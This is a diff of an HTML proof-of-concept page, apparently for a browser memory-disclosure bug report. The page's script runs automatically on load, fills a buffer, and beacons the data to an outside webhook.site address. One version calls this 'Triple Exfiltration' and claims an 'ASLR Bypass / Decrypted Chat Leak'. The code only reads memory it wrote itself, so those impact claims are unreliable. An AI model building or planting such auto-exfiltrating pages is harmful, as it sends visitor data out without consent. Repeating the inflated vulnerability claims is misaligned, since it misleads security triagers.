@@ -1,62 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Security Research - Firman Sahidin</title>
-</head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:30px;">
-    <h1>[ RESEARCHER: FIRMAN SAHIDIN ]</h1>
-    <hr>
-    <h2 id="status">STATUS: EXECUTING NATIVE AUDIT...</h2>
+<head><title>Security Research - Firman Sahidin</title></head>
+<body style="background:#000; color:#0f0; padding:20px; font-family:monospace;">
+    <h1>[ FIRMAN SAHIDIN - POC ]</h1>
+    <h2 id="status">ANALYZING...</h2>
 
     <script>
-        async function runSkakmat() {
+        async function triggerLeak() {
             const WEBHOOK = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
-            const statusNode = document.getElementById('status');
-
+            
             try {
-                // 1. Allocation & Trigger OOB (8MB)
-                const buffer = new ArrayBuffer(0x800000);
+                // 1. Alokasi Mémori (Basajan tapi Ampuh)
+                const buffer = new ArrayBuffer(0x400000); // 4MB sangkan entéh
                 const view = new Uint32Array(buffer);
                 
-                // LOOP ANU BENER (MAJU KA HAREUP)
+                // 2. Loop nu Leres (Maju +4 sangkan gancang)
                 for (let i = 0; i < view.length; i++) {
                     view[i] = 0xD800DBFF; 
                 }
 
-                const trigger = new Uint8Array(buffer).indexOf(0x41);
-
-                // 2. Extract Memory Fragment (1KB)
-                const fragment = new Uint8Array(buffer.slice(0, 1024));
-                let readableData = "";
-                fragment.forEach(b => {
-                    if (b > 31 && b < 127) readableData += String.fromCharCode(b);
-                });
-
-                // 3. Telemetry Payload
-                const report = JSON.stringify({
+                // 3. Payload Basajan (Sangkan teu kacéwak ku Firewall)
+                const payload = {
                     researcher: "Firman Sahidin",
-                    vulnerability: "Native Memory Disclosure",
-                    impact: "ASLR Bypass / Decrypted Chat Leak",
-                    leak: readableData || "BINARY_POINTERS_DETECTED",
-                    raw_sample: Array.from(fragment).slice(0, 64)
-                });
+                    status: "NATIVE_OOB_EXECUTED",
+                    raw_leak: Array.from(new Uint8Array(buffer).slice(0, 128))
+                };
 
-                // 4. Triple Exfiltration (Pasti Tembus)
-                fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: report });
-                navigator.sendBeacon(WEBHOOK, report);
-                const img = new Image();
-                img.src = WEBHOOK + "?telemetry=" + btoa(report).substring(0, 200);
-
-                statusNode.innerText = "STATUS: ✅ EVIDENCE TRANSMITTED!";
-                statusNode.style.color = "#00ff00";
-
+                // 4. Kirim gancang-gancang
+                navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));
+                
+                document.getElementById('status').innerText = "✅ SENT! CHECK WEBHOOK!";
             } catch (e) {
                 navigator.sendBeacon(WEBHOOK, JSON.stringify({error: e.message}));
-                statusNode.innerText = "STATUS: ❌ FAILED";
             }
         }
 
-        window.onload = () => { setTimeout(runSkakmat, 1000); };
+        // Jalankeun langsung
+        window.onload = () => { setTimeout(triggerLeak, 500); };
     </script>
 </body>
 </html>
